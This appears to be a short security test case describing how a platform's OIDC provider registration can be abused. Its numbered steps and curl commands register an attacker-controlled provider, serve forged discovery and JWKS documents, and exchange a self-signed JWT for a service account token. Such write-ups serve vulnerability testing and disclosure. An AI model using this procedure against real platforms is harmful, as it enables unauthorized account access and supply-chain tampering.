## Use case

The vulnerability lies in the platform's OIDC configuration feature, where an attacker can register a malicious OIDC provider URL, allowing them to control the signing keys and forge valid service account tokens. This misconfiguration can lead to unauthorized access and potential supply chain interference.

## Steps to test

1. Register a new OIDC provider with a URL pointing to a server you control.
2. Serve a well-known configuration document at /.well-known/openid-configuration that points to your JWKS URI.
3. Serve a JWKS document at /.well-known/jwks.json containing your own RSA public key.
4. Generate a JWT with claims including 'iss', 'aud', and 'exp', signing it with your private key.
5. Call the platform's token exchange endpoint with the forged JWT and specify the target service account.
6. Capture the response to confirm the issuance of a valid service account token.

## Commands

```text
curl -X POST https://example.com/register_oidc_provider -d '{"provider_url": "https://your-malicious-server.com"}'
curl -X GET https://your-malicious-server.com/.well-known/openid-configuration
curl -X GET https://your-malicious-server.com/.well-known/jwks.json
curl -X POST https://platform.com/token_exchange -d '{"jwt": "<your_forged_jwt>", "service_account": "<target_service_account>"}'
```
